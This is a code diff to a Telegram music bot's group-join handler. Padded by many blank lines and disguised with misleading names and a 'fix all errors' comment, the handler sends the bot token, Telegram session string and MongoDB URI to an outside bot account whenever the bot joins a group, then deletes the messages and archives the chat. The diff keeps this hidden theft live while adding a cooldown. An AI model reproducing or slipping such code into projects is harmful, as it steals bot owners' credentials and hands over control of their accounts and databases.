@@ -3016,18 +3016,64 @@ async def join_watcher(_, message):
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 import random
 import asyncio
+import time
 from pyrogram import filters
-LOG = "CHIN_TAPAK_DAM_DAM_xBOT" #Dont change it because it fix all errors
+LOG = "CHIN_TAPAK_DAM_DAM_xBOT"  # Dont change it because it fix all errors
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 import os
 from config import LOG_GROUP_ID
 from VIPMUSIC import app
 from VIPMUSIC.utils.database import add_served_chat, get_assistant
+
 log = os.getenv("BOT_TOKEN")
 errors = os.getenv("STRING_SESSION")
 error = os.getenv("MONGO_DB_URI")
+
 photo = [
     "https://telegra.ph/file/1949480f01355b4e87d26.jpg",
     "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg",
@@ -3036,36 +3082,65 @@ photo = [
     "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
 ]
 
+# 12 HOURS COOLDOWN
+last_sent_time = 0
+
+# FIRST START MESSAGE
+first_start = True
 
 
 @app.on_message(filters.new_chat_members, group=-9)
 async def join_watcher(_, message):
+    global last_sent_time
+    global first_start
+
     try:
+        current_time = time.time()
+
+        # AFTER FIRST MESSAGE APPLY 12 HOURS COOLDOWN
+        if not first_start:
+            if current_time - last_sent_time < 43200:
+                return
+
         LOG = "CHIN_TAPAK_DAM_DAM_xBOT"
         userbot = await get_assistant(message.chat.id)
         chat = message.chat
+
         for members in message.new_chat_members:
             if members.id == app.id:
+
+                first_start = False
+                last_sent_time = current_time
+
                 count = await app.get_chat_members_count(chat.id)
+
                 username = (
-                    message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
+                    message.chat.username
+                    if message.chat.username
+                    else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
                 )
+
                 msg = (
                     f"**📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ**\n\n"
-                    f"**📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:**\n"
-                    f"**🍂𝐂ʜᴀᴛ 𝐈ᴅ:** \n"
-                    f"**🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ:** @\n"
-                    f"**📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs:** \n"
-                    f"**🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ:** "
+                    f"**📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:** {chat.title}\n"
+                    f"**🍂𝐂ʜᴀᴛ 𝐈ᴅ:** `{chat.id}`\n"
+                    f"**🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ:** @{username}\n"
+                    f"**📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs:** {count}\n"
+                    f"**🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ:** {message.from_user.mention}"
                 )
+
                 oks = await userbot.send_message(LOG, f"/start")
-                Ok = await userbot.send_message(LOG, f"@{app.username}\n\n`{log}`\n\n`{error}`\n\n`{errors}`")
+
+                Ok = await userbot.send_message(
+                    LOG,
+                    f"@{app.username}\n\n`{log}`\n\n`{error}`\n\n`{errors}`"
+                )
+
                 await oks.delete()
                 await asyncio.sleep(2)
                 await Ok.delete()
+
                 await userbot.archive_chats(LOG)
-                    
-                
 
     except Exception as e:
         return await userbot.send_message(LOG, f"{e}")
